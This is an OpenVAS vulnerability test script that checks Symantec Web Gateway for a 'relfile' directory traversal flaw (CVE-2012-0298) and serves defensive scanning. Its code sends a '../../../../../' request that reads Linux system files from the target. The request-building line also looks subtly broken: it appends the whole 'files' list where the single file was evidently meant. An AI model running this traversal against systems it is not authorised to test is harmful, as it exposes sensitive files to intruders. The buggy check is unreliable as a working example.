###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_symantec_web_gateway_53444.nasl 11857 2018-10-12 08:25:16Z cfischer $
#
# Symantec Web Gateway 'relfile' Parameter Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################
CPE = "cpe:/a:symantec:web_gateway";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103489");
  script_bugtraq_id(53442);
  script_cve_id("CVE-2012-0298");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_version("$Revision: 11857 $");

  script_name("Symantec Web Gateway 'relfile' Parameter Directory Traversal Vulnerability");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 10:25:16 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-05-18 10:03:57 +0200 (Fri, 18 May 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_symantec_web_gateway_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("symantec_web_gateway/installed");
  script_tag(name:"impact", value:"Successful exploitation could allow attackers to read arbitrary files via
  directory traversal attacks and gain sensitive information.");
  script_tag(name:"affected", value:"Symantec Web Gateway versions 5.0.x before 5.0.3");
  script_tag(name:"insight", value:"The flaw is due to an improper validation of user-supplied input
  passed  via the 'relfile' parameter to the '/spywall/releasenotes.php',
  which allows  attackers to read arbitrary files via a ../(dot dot) sequences.");
  script_tag(name:"solution", value:"Upgrade to Symantec Web Gateway version 5.0.3 or later.");
  script_tag(name:"summary", value:"This host is running Symantec Web Gateway and is prone to directory
  traversal vulnerability.");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53442");
  script_xref(name:"URL", value:"http://www.symantec.com/business/web-gateway");
  script_xref(name:"URL", value:"http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00");
  script_xref(name:"URL", value:"http://secunia.com/advisories/49216");
  script_tag(name:"solution_type", value:"VendorFix");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = string(dir, "/spywall/releasenotes.php?relfile=../../../../../" + files);

  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
    report = report_vuln_url(port:port, url:url);
    security_message(data:report, port:port);
    exit(0);
  }
}

exit(99);
